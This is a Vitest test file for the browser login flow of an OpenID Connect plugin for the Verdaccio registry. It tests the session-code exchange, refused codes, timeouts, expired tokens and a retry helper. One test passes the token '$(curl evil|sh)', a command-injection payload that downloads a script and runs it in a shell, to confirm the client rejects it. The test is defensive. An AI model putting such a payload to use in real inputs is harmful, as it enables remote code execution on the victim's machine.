// @vitest-environment jsdom
/**
 * Tests for the client entry point: the login exchange, the expired session,
 * and the two ways the login button is taken over.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { SESSION_EXCHANGE_TIMEOUT_MS } from "@/client/constants";
import { init, retry } from "@/client/init";

const { clearCredentials, isUITokenExpired, saveCredentials } = vi.hoisted(() => ({
  clearCredentials: vi.fn(),
  isUITokenExpired: vi.fn(() => false),
  saveCredentials: vi.fn(),
}));

vi.mock(import("@/client/credentials"), async (importOriginal) => {
  const actual = await importOriginal();

  return {
    ...actual,
    clearCredentials,
    isUITokenExpired,
    saveCredentials,
  };
});

const HEADER = `<button type="button" data-testid="header--button-login">Sign in</button>`;

const CREDENTIALS = { username: "tom", uiToken: "ui-token", npmToken: "npm-token" };

let fetchMock: ReturnType<typeof vi.fn>;

function setLocation(search: string): void {
  vi.stubGlobal("location", {
    search,
    pathname: "/",
    host: "localhost:4873",
    protocol: "http:",
    assign: vi.fn(),
    reload: vi.fn(),
  });
}

function respondWith(body: unknown, ok = true, status = ok ? 200 : 401): void {
  fetchMock.mockResolvedValueOnce({ ok, status, json: async () => body });
}

describe("init", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.useFakeTimers();
    vi.spyOn(document, "addEventListener");
    vi.spyOn(window, "addEventListener");
    isUITokenExpired.mockReturnValue(false);
    document.body.innerHTML = HEADER;
    window.__VERDACCIO_BASENAME_UI_OPTIONS = { base: "https://registry.example.com/" } as never;
    window.__VERDACCIO_OPENID_OPTIONS = { keepPasswdLogin: false, loginButtonText: "Login with OpenID Connect" };
    setLocation("");
    vi.stubGlobal("history", { replaceState: vi.fn() });

    fetchMock = vi.fn();
    vi.stubGlobal("fetch", fetchMock);
  });

  afterEach(() => {
    for (const [type, listener, options] of vi.mocked(document.addEventListener).mock.calls) {
      if (type === "click" && listener) document.removeEventListener(type, listener, options);
    }
    for (const [type, listener, options] of vi.mocked(window.addEventListener).mock.calls) {
      if (type === "popstate" && listener) window.removeEventListener(type, listener, options);
    }
    vi.restoreAllMocks();
    vi.clearAllTimers();
    vi.useRealTimers();
    vi.unstubAllGlobals();
  });

  it("exchanges the code of the redirect and reloads without it", async () => {
    setLocation("?code=login-code");
    respondWith(CREDENTIALS);

    await init();

    expect(fetchMock).toHaveBeenCalledWith(
      "https://registry.example.com/-/oauth/session",
      expect.objectContaining({ method: "POST", credentials: "same-origin" }),
    );
    expect(JSON.parse(fetchMock.mock.calls[0][1].body)).toEqual({ code: "login-code" });
    expect(saveCredentials).toHaveBeenCalledWith(CREDENTIALS);
    expect(history.replaceState).toHaveBeenCalledWith(null, "", "/");
    expect(location.reload).toHaveBeenCalled();
  });

  it("never signs in from query parameters alone", async () => {
    setLocation("?username=tom&uiToken=ui-token&npmToken=npm-token");

    await init();

    expect(fetchMock).not.toHaveBeenCalled();
    expect(saveCredentials).not.toHaveBeenCalled();
  });

  it("ignores a redirect whose tokens are not tokens", async () => {
    setLocation("?code=login-code");
    respondWith({ ...CREDENTIALS, npmToken: "$(curl evil|sh)" });

    await init();

    expect(saveCredentials).not.toHaveBeenCalled();
  });

  it("drops a code the server refuses, and stays signed out", async () => {
    setLocation("?code=someone-elses-code");
    respondWith({ error: "login does not belong to this browser" }, false);

    await init();

    expect(saveCredentials).not.toHaveBeenCalled();
    expect(history.replaceState).toHaveBeenCalledWith(null, "", "/");
    expect(location.reload).not.toHaveBeenCalled();
  });

  it("keeps working when the exchange request fails", async () => {
    setLocation("?code=login-code");
    fetchMock.mockRejectedValueOnce(new Error("network down"));

    await expect(init()).resolves.toBeUndefined();

    expect(saveCredentials).not.toHaveBeenCalled();
  });

  it("survives a malformed query string and still takes over the login button", async () => {
    setLocation("?%");

    await expect(init()).resolves.toBeUndefined();

    document.querySelector<HTMLElement>('[data-testid="header--button-login"]')!.click();

    expect(location.assign).toHaveBeenCalledWith("https://registry.example.com/-/oauth/authorize");
  });

  it("gives up on a hung exchange and still takes over the login button", async () => {
    setLocation("?code=hung");
    fetchMock.mockImplementationOnce(
      (_url: string, init: RequestInit) =>
        new Promise((_resolve, reject) => {
          init.signal?.addEventListener("abort", () => reject(new DOMException("Aborted", "AbortError")));
        }),
    );

    const pending = init();
    await vi.advanceTimersByTimeAsync(SESSION_EXCHANGE_TIMEOUT_MS);
    await pending;

    expect(saveCredentials).not.toHaveBeenCalled();

    document.querySelector<HTMLElement>('[data-testid="header--button-login"]')!.click();

    expect(location.assign).toHaveBeenCalledWith("https://registry.example.com/-/oauth/authorize");
  });

  it("clears the stored credentials when the UI token expired", async () => {
    isUITokenExpired.mockReturnValue(true);

    await init();

    expect(clearCredentials).toHaveBeenCalled();
  });

  it("intercepts a logout control that is not the first match of the selector", async () => {
    document.body.innerHTML = `${HEADER}<button type="button" data-testid="header--button-logout">A</button><button type="button" data-testid="logOutDialogIcon">B</button>`;

    await init();

    document.querySelector<HTMLElement>('[data-testid="logOutDialogIcon"]')!.click();

    expect(clearCredentials).toHaveBeenCalled();
    expect(location.assign).toHaveBeenCalledWith("https://registry.example.com/");
  });
});

describe("retry", () => {
  beforeEach(() => vi.useFakeTimers());
  afterEach(() => vi.useRealTimers());

  it("schedules the action `times` times with a 100ms * i delay", () => {
    const action = vi.fn();
    retry(action, 3);

    // Nothing runs synchronously.
    expect(action).not.toHaveBeenCalled();

    // Delays: 0, 100, 200.
    vi.advanceTimersByTime(0);
    expect(action).toHaveBeenCalledTimes(1);

    vi.advanceTimersByTime(100);
    expect(action).toHaveBeenCalledTimes(2);

    vi.advanceTimersByTime(100);
    expect(action).toHaveBeenCalledTimes(3);

    // No further calls beyond `times`.
    vi.advanceTimersByTime(1000);
    expect(action).toHaveBeenCalledTimes(3);
  });

  it("defaults `times` to 5", () => {
    const action = vi.fn();
    retry(action);

    vi.advanceTimersByTime(1000);
    expect(action).toHaveBeenCalledTimes(5);
  });

  it("stops running the action once `isDone` reports it", () => {
    const action = vi.fn();
    const isDone = vi.fn(() => action.mock.calls.length >= 2);

    retry(action, 5, isDone);

    vi.advanceTimersByTime(0);
    vi.advanceTimersByTime(100);
    expect(action).toHaveBeenCalledTimes(2);

    vi.advanceTimersByTime(1000);
    expect(action).toHaveBeenCalledTimes(2);
    expect(isDone).toHaveBeenCalledTimes(2);
  });
});
